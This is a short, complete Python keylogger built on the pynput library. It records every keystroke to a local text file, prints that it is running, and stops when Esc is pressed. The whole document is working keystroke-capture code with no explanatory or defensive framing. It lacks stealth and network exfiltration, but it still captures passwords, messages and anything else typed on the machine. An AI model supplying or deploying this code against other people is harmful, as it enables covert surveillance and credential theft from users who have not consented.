from pynput import keyboard

log_file = "keystrokes_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop on Esc key
        return False

print("Keylogger is running... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
